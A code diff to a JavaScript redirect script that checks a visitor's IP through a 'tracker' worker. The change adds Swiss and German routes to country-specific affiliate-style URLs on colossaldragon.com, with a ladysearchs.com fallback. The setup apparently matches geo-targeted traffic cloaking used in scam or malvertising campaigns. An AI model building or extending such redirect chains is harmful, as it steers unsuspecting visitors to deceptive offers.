@@ -1,9 +1,11 @@
 // ========== CONFIGURATION ==========
 const WORKER_URL = 'https://trackerworkerv2.lugangxyz.workers.dev/verify';
 const IP_CHECK_URL = 'https://trackerworkerv2.lugangxyz.workers.dev/check-ip';
-const SE_REDIRECT_URL = 'https://colossaldragon.com/?a=102032&c=121832&s1=G20&s2=G20';
-const NORWAY_REDIRECT_URL = 'https://colossaldragon.com/?a=102032&c=153951&s1=G20&s2=G20';
-const DEFAULT_REDIRECT_URL = 'https://glhpmr9.ladysearchs.com/xv7hcug'
+const se_REDIRECT_URL = 'https://colossaldragon.com/?a=102032&c=121832&s1=G20&s2=G20';
+const no_REDIRECT_URL = 'https://colossaldragon.com/?a=102032&c=153951&s1=G20&s2=G20';
+const ch_REDIRECT_URL = 'https://colossaldragon.com/?a=102032&c=120583&s1=G20&s2=G20';
+const de_REDIRECT_URL = 'https://colossaldragon.com/?a=102032&c=146265&s1=G20&s2=G20';
+const DEFAULT_REDIRECT_URL = 'https://glhpmr9.ladysearchs.com/xv7hcug';
 
 // ========== GLOBAL STATE ==========
 let userCountry = '';
@@ -139,13 +141,17 @@ function extractCampCode(fragmentData) {
 }
 
 // Pick the redirect URL based on country
-// - SE (Sweden) -> SE_REDIRECT_URL
-// - NO (Norway) -> NORWAY_REDIRECT_URL
+// - SE (Sweden) -> se_REDIRECT_URL
+// - NO (Norway) -> no_REDIRECT_URL
+// - CH (Switzerland) -> ch_REDIRECT_URL
+// - DE (Germany) -> de_REDIRECT_URL
 // - Otherwise   -> DEFAULT_REDIRECT_URL
 function getRedirectUrl() {
     const country = (userCountry || '').toUpperCase();
-    if (country === 'SE') return SE_REDIRECT_URL;
-    if (country === 'NO') return NORWAY_REDIRECT_URL;
+    if (country === 'SE') return se_REDIRECT_URL;
+    if (country === 'NO') return no_REDIRECT_URL;
+    if (country === 'CH') return ch_REDIRECT_URL;
+    if (country === 'DE') return de_REDIRECT_URL;
     return DEFAULT_REDIRECT_URL;
 }
 
